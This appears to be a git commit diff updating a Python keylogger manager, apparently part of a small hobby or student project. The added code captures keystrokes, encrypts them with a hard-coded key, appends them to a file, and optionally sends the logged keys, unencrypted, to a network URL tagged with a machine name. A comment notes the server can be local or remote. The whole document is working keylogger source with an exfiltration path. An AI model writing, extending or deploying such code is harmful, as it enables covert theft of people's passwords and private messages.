35913746979e8d8781187ef4f43ddc12554c17c8
Yehouda-12 <coheny748@gmail.com>
2025-09-03 10:17:03 +0300

    Update key_logger_manager.py

--- key_logger_manager.py
+++ key_logger_manager.py
@@ -1,30 +1,56 @@
 from KeyLoggerService import KeyLogger
 from fileWriter import MyFile
+from network_writer import NetworkWriter
 from Encryption import Crypto
+import json
 
 class KeyLoggerManager:
-    def __init__(self):
+    def __init__(self, file_path="encrypt.txt", network_url=None, crypto_key="abcdefjhijklmnopqrstuvwxyz"):
         self.logger = KeyLogger()
-        self.file = MyFile("encrypt.txt")
-        self.crypto = Crypto("abcdefjhijklmnopqrstuvwxyz")
+        self.crypto = Crypto(crypto_key)
 
+        # Writer file
+        self.file = MyFile(file_path)
+
+        # Writer network (option)
+        if network_url:
+            self.network_writer = NetworkWriter(network_url, self.crypto)
+        else:
+            self.network_writer = None
 
     def start_logger(self):
         self.logger.start_logging()
 
-    def stop_logger(self):
+    def stop_logger(self, machine_name="Machine_01"):
         self.logger.stop_logging()
         data = str(self.logger.get_logged_keys())
 
-        encrypt = self.crypto.process(data)
-        self.file.write_to_file(str(encrypt))
+        # Encryption
+        encrypted_data = self.crypto.process(data)
+
+        # Write to file
+        with open(self.file.file_name, "a") as f:
+            f.write(json.dumps(encrypted_data) + "\n")  # une ligne par session
+
+        # send to network
+        if self.network_writer:
+            self.network_writer.send_data(data, machine_name)
 
 
-
-
+# - example---
 if __name__ == "__main__":
-    a = KeyLoggerManager()
-    a.start_logger()
-    a.stop_logger()
-    print(a.file.file_name)
-    print(a.file.read_file())
+    # for use only the file :
+    # manager = KeyLoggerManager(file_path="encrypt.txt")
+
+    # for use file + network :
+    manager = KeyLoggerManager(
+        file_path="encrypt.txt",
+        network_url="http://127.0.0.1:5000/post"  # serveur local ou distant
+    )
+
+    manager.start_logger()
+    manager.stop_logger("Machine_01")
+
+    print("File :", manager.file.file_name)
+    print("File contain :", manager.file.read_file())
+
